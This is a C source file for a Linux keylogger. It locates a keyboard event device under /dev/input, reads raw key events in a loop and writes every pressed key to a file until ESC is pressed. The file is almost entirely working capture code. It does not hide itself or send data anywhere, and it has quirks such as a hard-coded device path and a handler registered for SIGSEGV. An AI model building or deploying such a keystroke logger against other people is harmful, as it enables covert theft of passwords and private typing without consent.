#include <linux/input.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
 
char keys[59] = {
	'\0',
	'\0',
	'1',
	'2',
	'3',
	'4',
	'5',
	'6',
	'7',
	'8',
	'9',
	'0',
	'\0',
	'\0',
	'\0',
	'\0',
	'Q',
	'W',
	'E',
	'R',
	'T',
	'Y',
	'U',
	'I',
	'O',
	'P',
	'\0',
	'\0',
	'\0',
	'\0',
	'A',
	'S',
	'D',
	'F',
	'G',
	'H',
	'J',
	'K',
	'L',
	';',
	'\'',
	'\0',
	'\0',
	'\\',
	'Z',
	'X',
	'C',
	'V',
	'B',
	'N',
	'M',
	',',
	'.',
	'/',
	'\0',
	'*',
	'\0',
	' ',
	'\0'
};

static volatile int dontStop = 1;

void sigintHandler(int sig_num) {

	signal(SIGSEGV, sigintHandler);
	printf("Stopping keylog\n");
	dontStop = 0;

}

char* findFile() {


	char *full_path;
	char *dir = "/dev/input/by-path/";

	DIR *dp;
	struct dirent *entry;
	struct stat statbuf;

	if ((dp = opendir(dir)) == NULL) {
		fprintf(stderr, "cannot open directory: %s\n", dir);
		return "";
	}
	chdir(dir);

	while ((entry = readdir(dp)) != NULL) {
		lstat(entry->d_name, &statbuf);
		char* file_name = entry->d_name;
		if (strstr(file_name, "event-kbd") != NULL) {
			printf("%s\n", file_name);
			full_path = (char *) malloc(1+ strlen(dir) + strlen(file_name));
			strcpy(full_path, dir);
			strcat(full_path, file_name);
			return full_path;
		}
	}
	closedir(dp);
	return full_path;
}

void* keylogPhysical(void* arg) {
	char* fileName = (char*)arg;

	signal(SIGSEGV, sigintHandler);

	char cwd[PATH_MAX];
	getcwd(cwd, sizeof(cwd));

	printf("directory: %s", cwd);

	char* dev = findFile();
	chdir(cwd);

	printf("Found file: %s\n", dev);
	printf("Before open");
	// The buffer path
	dev = "/dev/input/by-path/pci-0000:00:14.0-usb-0:10:1.1-event-kbd";
	int fd;
	fd = open(dev, O_RDWR); // Open the buffer
	printf("After open");
	//fd = open(dev, O_RDONLY); // Open the buffer
	if (fd == -1) {
	       printf("Error opening!");	
	       return NULL;
	}

	struct input_event ev;
	ssize_t n;
	 
	FILE *fileAddress;
	fileAddress = fopen(fileName, "w+");

	//printf("dontStop is %d", dontStop);

	printf("Before while");
	// Our keylogger need to read every keystroke, so we will need to loop until break
	
	while (dontStop) {
		signal(SIGSEGV, sigintHandler);
		printf("In while");
		n = read(fd, &ev, sizeof ev); // Read from the buffer
		 
		/* Now, if everything went as expected and a key is
		*   pressed we should have an event, events looks like this:
		*
		* struct input_event {
		* struct timeval time;
		* unsigned short type; // Type of event, we are looking for EV_KEY
		* unsigned short code; // Key code in LKC standard (See bellow)
		* unsigned int value; // 0 == released; 1 == pressed; 2 == repeated
		* };
		*/
		 
		// Now that we have an event, we have to filter it to just
		// fire when the event is EV_KEY and a key is pressed down

		if (ev.type == EV_KEY && ev.value == 1) {
			printf("Key %c has been pressed with code %d\n", keys[ev.code], ev.code);
			char k = keys[ev.code];
			fputc(k, fileAddress);
		}
		 
		// Since we want a safe way to kill the loop safely (closing the stream and all)
		if (ev.code == KEY_ESC) break;
		// As you see, we can use key defs from input-event-codes.h
	}
	printf("After while");

	fclose(fileAddress);
	// And don't forget to close the buffer and exit safely
	close(fd);
	fflush(stdout);
	return NULL;
}
